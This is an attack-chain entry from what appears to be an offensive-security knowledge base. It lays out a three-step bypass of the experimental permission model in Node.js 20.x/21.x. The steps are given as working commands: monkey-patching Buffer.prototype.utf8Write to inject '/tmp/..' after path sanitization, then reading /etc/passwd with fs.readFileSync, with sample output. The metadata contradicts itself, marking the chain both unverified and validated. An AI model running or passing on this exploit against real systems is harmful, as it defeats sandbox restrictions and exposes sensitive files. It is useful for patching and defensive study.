---
id: ac-nodejs-path-traversal-bypass
name: >-
  Path Traversal Bypass in Node.js Experimental Permission Model via Buffer
  Monkey-Patching
type: attack_chain
description: >-
  A multi-stage attack exploiting a path traversal vulnerability in Node.js
  experimental permission model by monkey-patching Buffer internals to bypass
  file system restrictions.
verified: false
submitted: true
step_count: 3
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:26:27.239Z'
procedures:
  - '[[procedures/Node-Enable-Experimental-Permission-Model]]'
  - '[[procedures/Monkey-Patch-Buffer-utf8Write]]'
  - '[[procedures/Exploit-Path-Traversal-Read-File]]'
techniques:
  - '[[JavaScript]]'
  - '[[Process Injection]]'
tactics:
  - '[[Execution]]'
  - '[[Privilege Escalation]]'
tags:
  - path-traversal
  - node.js
  - monkey-patch
  - buffer
  - permission-bypass
platforms:
  - Node.js
  - Linux
tools:
  - '[[tools/Node.js]]'
complexity: medium
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Process Injection]]'
---

# Path Traversal Bypass in Node.js Experimental Permission Model via Buffer Monkey-Patching

Multi-stage attack chain demonstrating a complete attack workflow exploiting the experimental permission model in Node.js versions 20.x and 21.x.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~2 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Enable Permission Model] --> B[Monkey-Patch Buffer]
    B --> C[Exploit Path Traversal]
    C --> D[Bypass FS Permissions]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Node.js]]

### Target Environment

- Node.js runtime (versions 20.x or 21.x)
- Linux OS
- Access to Node.js REPL

### Initial Access Requirements

- Local or remote access to execute Node.js
- No special credentials needed beyond shell access
- Experimental permission model must be available

## Detailed Attack Procedures

### Step 1: Enable Experimental Permission Model

procedure: [[procedures/Node-Enable-Experimental-Permission-Model]]

**Objective**: Launch Node.js with the experimental permission model enabled and restrict file read access to /tmp to set up the vulnerable environment.

**Instructions**: Start the Node.js REPL using [[commands/node-enable-experimental-permission]] to enable permissions and limit fs.read to /tmp:

```bash
node --experimental-permission --allow-fs-read=/tmp
```

**Expected Output**: Node.js REPL welcome message, e.g., "Welcome to Node.js v20.8.1. Type ".help" for more information."

**Success Indicators**:
- REPL starts without errors
- Permission model is active (test with a restricted fs.read outside /tmp to confirm denial)

### Step 2: Monkey-Patch Buffer Prototype

procedure: [[procedures/Monkey-Patch-Buffer-utf8Write]]

**Objective**: Intercept and modify path strings during Buffer.from() conversion to enable path traversal after sanitization.

**Instructions**: In the REPL, execute [[commands/buffer-utf8write-monkeypatch]] to overwrite Buffer.prototype.utf8Write:

```javascript
Buffer.prototype.utf8Write = ((w) => function (str, ...args) { return w.apply(this, [str.replace(/^\/exploit/, '/tmp/..'), ...args]); })(Buffer.prototype.utf8Write);
```

**Expected Output**: Returns the anonymous function reference, e.g., "[Function (anonymous)]".

**Success Indicators**:
- No errors on execution
- Prototype is modified (verify by logging the function)

### Step 3: Exploit Path Traversal

procedure: [[procedures/Exploit-Path-Traversal-Read-File]]

**Objective**: Read unauthorized files like /etc/passwd by providing a crafted path that triggers the monkey-patch to bypass restrictions.

**Instructions**: Use [[commands/fs-readfile-sync-exploit]] to attempt reading /etc/passwd via the encoded malicious path:

```javascript
fs.readFileSync(new TextEncoder().encode('/exploit/etc/passwd'))
```

**Expected Output**: Buffer contents of /etc/passwd, e.g., "<Buffer 72 6f 6f 74 3a 78 3a 30 3a 30 3a 72 6f 6f 74 3a 2f 72 6f 6f 74 3a 2f 62 69 6e 2f 62 61 73 68 0a ...>".

**Success Indicators**:
- File contents returned without permission error
- Confirms bypass (compare to failed read without patch)

## Attack Chain Summary

### Key Achievements

1. Successfully enabled and restricted the experimental permission model.
2. Monkey-patched Buffer internals to alter path resolution post-sanitization.
3. Bypassed FS permissions to read sensitive files outside allowed directories.

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[JavaScript]]
- [[Process Injection]]

### MITRE ATT&CK Tactics

- [[Execution]]
- [[Privilege Escalation]]

---
*Last updated: 2024-01-01T00:00:00Z*
